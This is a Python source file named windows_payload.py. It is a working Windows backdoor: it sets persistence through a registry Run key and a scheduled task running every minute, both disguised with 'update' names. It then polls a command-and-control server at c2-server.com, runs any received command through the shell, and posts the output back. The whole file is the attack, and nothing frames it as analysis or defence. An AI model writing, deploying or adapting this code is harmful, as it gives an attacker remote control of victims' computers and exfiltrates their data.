# windows_payload.py
import os
import subprocess
import requests
import time
import winreg

def setup_persistence():
    # Setup registry persistence
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 
                          r"Software\Microsoft\Windows\CurrentVersion\Run")
    winreg.SetValueEx(key, "UpdateService", 0, winreg.REG_SZ, 
                     os.path.abspath("payload.exe"))
    winreg.CloseKey(key)
    
    # Setup scheduled task
    subprocess.run(["schtasks", "/create", "/tn", "SystemUpdate", 
                   "/tr", os.path.abspath("payload.exe"),
                   "/sc", "minute", "/mo", "1"])

def setup_c2():
    # Setup C2 channel
    while True:
        try:
            resp = requests.get("https://c2-server.com/cmd")
            if resp.status_code == 200:
                cmd = resp.json()["cmd"]
                output = subprocess.check_output(cmd, shell=True)
                requests.post("https://c2-server.com/output", 
                             json={"output": output.decode()})
        except:
            time.sleep(5)

setup_persistence()
setup_c2()